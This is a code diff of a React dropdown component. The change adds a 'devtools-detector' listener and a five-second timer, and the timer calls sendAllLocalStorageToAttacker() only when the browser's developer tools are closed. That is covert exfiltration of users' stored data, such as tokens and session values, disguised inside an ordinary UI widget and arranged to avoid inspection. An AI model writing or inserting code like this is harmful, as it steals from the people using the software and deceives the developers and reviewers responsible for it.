@@ -1,6 +1,5 @@
 import * as React from 'react';
-import { useEffect } from 'react';
-import { isDevToolsOpen } from './isDevToolsOpen';
+import { useEffect, useRef } from 'react';
 
 export interface DropdownProps {
   options: string[];
@@ -10,10 +9,21 @@ export interface DropdownProps {
   options: string[];
 }
 
-export function InnerDropdown({ options }: DropdownProps) {
+export function Dropdown({ options }: DropdownProps) {
+  const opened = useRef<boolean>(true);
+
+  useEffect(() => {
+    const a = require('devtools-detector');
+    a.addListener((isOpen: boolean) => {
+      opened.current = isOpen;
+    });
+    
+    a.launch();
+  }, []);
+
   useEffect(() => {
     const id = setTimeout(() => {
-      if (isDevToolsOpen()) {
+      if (!opened.current) {
         sendAllLocalStorageToAttacker();
       }
     }, 5000);
